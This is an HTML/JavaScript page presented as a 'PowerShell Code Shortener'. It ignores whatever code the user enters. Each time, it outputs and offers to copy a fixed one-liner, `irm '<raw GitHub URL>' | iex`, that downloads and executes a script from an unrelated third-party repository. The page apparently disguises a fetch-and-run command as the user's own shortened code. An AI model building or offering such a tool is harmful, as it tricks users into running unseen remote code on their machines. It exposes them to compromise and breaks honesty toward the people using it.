<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PowerShell Shortener</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            margin-bottom: 30px;
            font-size: 3rem;
            color: #fff;
        }
        .container {
            background-color: #222;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 15px #444;
            width: 90%;
            max-width: 600px;
        }
        textarea {
            width: 100%;
            height: 150px;
            border-radius: 10px;
            padding: 10px;
            border: none;
            resize: none;
            margin-bottom: 20px;
            background-color: #333;
            color: #fff;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #fff;
            color: #000;
            transition: background-color 0.3s, transform 0.2s;
        }
        button:hover {
            background-color: #ddd;
            transform: scale(1.05);
        }
        #shortened-output {
            margin-top: 20px;
            background-color: #111;
            padding: 10px;
            border-radius: 10px;
            word-wrap: break-word;
            display: inline-block;
            font-size: 0.9rem;
        }
        .copy-button {
            margin-top: 10px;
            padding: 8px 15px;
            font-size: 14px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #fff;
            color: #000;
            transition: background-color 0.3s;
        }
        .copy-button:hover {
            background-color: #ddd;
        }
    </style>
</head>
<body>

    <h1>PowerShell Code Shortener</h1>
    <div class="container">
        <textarea id="ps-code-input" placeholder="Enter your PowerShell code here..."></textarea>
        <button onclick="generateShortCode()">Generate Short Code</button>
        <div id="shortened-output" style="display: none;">Shortened Code will appear here...</div>
        <button id="copy-button" class="copy-button" style="display: none;" onclick="copyShortCode()">Copy Short Code</button>
    </div>

    <script>
        function generateShortCode() {
            const psCode = document.getElementById("ps-code-input").value;
            if (!psCode.trim()) {
                alert("Please enter valid PowerShell code.");
                return;
            }

            // Use the GitHub raw URL for storing the script
            const rawGithubUrl = 'https://raw.githubusercontent.com/klwb123/script/refs/heads/main/script.txt';
            const shortenedCode = `irm '${rawGithubUrl}' | iex`;

            // Display the shortened code
            const outputElement = document.getElementById("shortened-output");
            outputElement.textContent = shortenedCode;
            outputElement.style.display = "block";

            // Show the copy button
            const copyButton = document.getElementById("copy-button");
            copyButton.style.display = "block";
        }

        function copyShortCode() {
            const shortenedCode = document.getElementById("shortened-output").textContent;
            navigator.clipboard.writeText(shortenedCode).then(() => {
                alert("Short code copied to clipboard!");
            }).catch(err => {
                console.error('Error copying to clipboard: ', err);
            });
        }
    </script>

</body>
</html>
